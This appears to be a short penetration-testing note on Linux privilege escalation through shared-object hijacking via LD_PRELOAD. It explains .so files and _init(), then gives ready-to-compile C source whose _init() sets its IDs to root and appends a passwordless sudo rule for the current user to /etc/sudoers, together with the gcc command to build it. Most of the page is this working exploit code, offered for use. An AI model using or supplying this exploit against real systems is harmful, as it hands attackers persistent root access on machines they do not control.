## Shared Objects
An `.so` file in Linux (and other UNIX-like systems) is a shared object library — similar to a .dll on Windows.
It contains compiled code (machine instructions) that can be dynamically loaded by executables or other libraries at runtime.
When a .so is loaded, if it contains an `_init()` function, the linker automatically calls it.

Look if this library can be placed in folder from LD_PRELOAD. This would be similar to DLL Search Order Hijacking from Windows.

Create following file `a.c`
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo '<current user> ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
```
Compile it with
```
gcc -fPIC -shared -o ./<name>.so a.c -nostartfiles
```
If binary/process running as root loads and executed it, it will add our user as sudoer.

